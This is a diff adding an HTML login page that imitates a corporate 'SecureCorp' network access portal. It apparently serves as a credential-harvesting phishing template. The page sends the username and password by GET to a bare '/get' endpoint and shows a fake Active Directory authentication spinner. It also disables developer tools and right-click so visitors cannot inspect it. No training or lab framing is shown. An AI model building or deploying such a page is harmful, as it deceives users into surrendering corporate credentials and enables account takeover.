@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Corporate Network Access - SecureCorp</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            border-top: 5px solid #3498db;
+        }
+        .company-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            font-weight: bold;
+        }
+        .company-name {
+            color: #2c3e50;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            color: #7f8c8d;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .security-notice {
+            background: #ecf0f1;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border-left: 4px solid #e74c3c;
+            text-align: left;
+        }
+        .security-notice h4 {
+            color: #e74c3c;
+            margin: 0 0 8px 0;
+            font-size: 14px;
+        }
+        .security-notice p {
+            margin: 0;
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #bdc3c7;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: all 0.3s;
+            box-sizing: border-box;
+            background: #f8f9fa;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #3498db;
+            background: white;
+            box-shadow: 0 0 8px rgba(52, 152, 219, 0.2);
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .login-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(52, 152, 219, 0.3);
+        }
+        .help-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #95a5a6;
+            text-align: left;
+        }
+        .help-text a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+        }
+        .spinner {
+            border: 2px solid #ecf0f1;
+            border-top: 2px solid #3498db;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .domain-suffix {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #95a5a6;
+            font-size: 14px;
+            pointer-events: none;
+        }
+        .username-container {
+            position: relative;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="company-logo">SC</div>
+        <div class="company-name">SecureCorp</div>
+        <p class="subtitle">Enterprise Network Access Portal</p>
+        
+        <div class="security-notice">
+            <h4>🔒 Security Notice</h4>
+            <p>This is a secure corporate network. All activities are monitored and logged for security purposes. Unauthorized access is prohibited.</p>
+        </div>
+        
+        <form action="/get" method="GET" id="loginForm">
+            <div class="form-group">
+                <label for="email">Corporate Username</label>
+                <div class="username-container">
+                    <input type="text" id="email" name="email" placeholder="john.doe" required>
+                    <span class="domain-suffix">@securecorp.com</span>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your corporate password" required>
+            </div>
+            
+            <button type="submit" class="login-btn">Authenticate</button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Authenticating with Active Directory...</p>
+            </div>
+        </form>
+        
+        <div class="help-text">
+            <strong>Need help?</strong><br>
+            • Forgot password? Contact IT Support: ext. 4357<br>
+            • New employee? Visit HR for account setup<br>
+            • VPN issues? Check <a href="#">IT Knowledge Base</a><br>
+            • Emergency access? Call security: ext. 911
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function() {
+            document.querySelector('.login-btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+        });
+        
+        // Auto-format username (remove spaces, convert to lowercase)
+        document.getElementById('email').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').toLowerCase();
+            e.target.value = value;
+        });
+        
+        // Simulate corporate environment behavior
+        document.addEventListener('keydown', function(e) {
+            // Disable F12, Ctrl+Shift+I, etc. (common in corporate environments)
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    </script>
+</body>
+</html>
